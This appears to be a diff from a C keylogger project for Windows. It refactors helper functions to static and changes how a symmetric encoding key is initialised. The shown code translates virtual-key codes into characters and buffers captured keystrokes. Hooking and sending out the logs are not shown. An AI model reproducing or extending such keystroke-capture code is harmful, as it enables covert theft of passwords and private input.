@@ -4,6 +4,12 @@
 #include "keylogger.h"
 
 
+// private method prototypes
+static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode);
+static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s);
+static void createKeyPairs(KEY_LOGGER* kLogger);
+
+
 KEY_LOGGER* initKeyLogger() {
     KEY_LOGGER* kLogger = malloc(sizeof(KEY_LOGGER));
     if (kLogger == NULL) { return NULL; }
@@ -20,7 +26,7 @@ KEY_LOGGER* initKeyLogger() {
     kLogger->keyBuffer[0] = '\0';
     kLogger->bufferPtr = 0;  // set the buffer pointer to the start
 
-    kLogger->encKey = ENC_KEY;  // init symmetric encoding key
+    kLogger->encKey = '\0';  // init symmetric encoding key
     
     createKeyPairs(kLogger);
     return kLogger;
@@ -101,7 +107,7 @@ ERR_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
  *  1. if shift flag is set
  *  2. if numPad is active and VK_NUMPAD0 <= vkCode <= VK_NUMPAD9
  */
-char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
+static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
     if (*vkCode >= A && *vkCode <= Z) {
         if (kLogger->capsLock || kLogger->shift) { 
             return kp->onShift;
@@ -122,7 +128,7 @@ char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
  * Manually writes the characters from the string represenation of an
  * unprintable key into the key buffer, returing the appropriate code
  */
-ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
+static ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
     // write each char of s into the buffer
     char* str = s;
     while (*str != '\0' && kLogger->bufferPtr < MAX_BUFF_LEN - 1) {
@@ -139,7 +145,7 @@ ERR_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
  * 
  * https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
  */
-void createKeyPairs(KEY_LOGGER* kLogger) {
+static void createKeyPairs(KEY_LOGGER* kLogger) {
     // initialise numpad values
     const char digits[10] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
     for (int i = 0; i <= 9; i++) {
